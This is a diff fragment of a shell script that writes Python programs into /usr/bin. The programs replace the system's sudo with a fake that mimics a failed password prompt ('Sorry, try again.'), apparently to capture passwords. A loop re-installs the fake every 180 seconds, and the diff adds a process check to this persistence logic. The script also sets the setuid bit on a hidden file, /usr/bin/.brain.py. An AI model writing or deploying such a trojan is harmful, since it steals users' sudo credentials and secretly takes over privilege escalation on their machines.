@@ -27,7 +27,7 @@ def main():
         time.sleep(3)
         os.system('stty echo')
         print("Sorry, try again.")
-        os.system("sudo su")
+        os.system("sudoA su")
 main()
 EOFA
 cat <<EOFB > /usr/bin/sudoC
@@ -49,15 +49,29 @@ def main():
         else:
             while(True):
                 if(os.path.exists("/usr/bin/sudoC")):
-                    os.system("mv /usr/bin/sudo /usr/bin/sudoA")
-                    os.system("mv /usr/bin/sudoC /usr/bin/sudo")
+                    if(checkStatus("sudoC")):
+                        pass
+                    else:
+                        os.system("mv /usr/bin/sudo /usr/bin/sudoA")
+                        os.system("mv /usr/bin/sudoC /usr/bin/sudo")
                 time.sleep(180)
     else:
         while(True):
             if(os.path.exists("/usr/bin/sudoC")):
-                os.system("mv /usr/bin/sudo /usr/bin/sudoA")
-                os.system("mv /usr/bin/sudoC /usr/bin/sudo")
+                if(checkStatus("sudoC")):
+                    pass
+                else:
+                    os.system("mv /usr/bin/sudo /usr/bin/sudoA")
+                    os.system("mv /usr/bin/sudoC /usr/bin/sudo")
             time.sleep(180)
+def checkStatus(fileName):
+    ps_output = subprocess.check_output(["ps", "-ef"])
+    ps_lines = ps_output.decode("utf-8").split("\n")
+    for line in ps_lines:
+        if fileName in line:
+            return True
+    else:
+        return False
 main()
 EOFC
 chmod +s /usr/bin/.brain.py
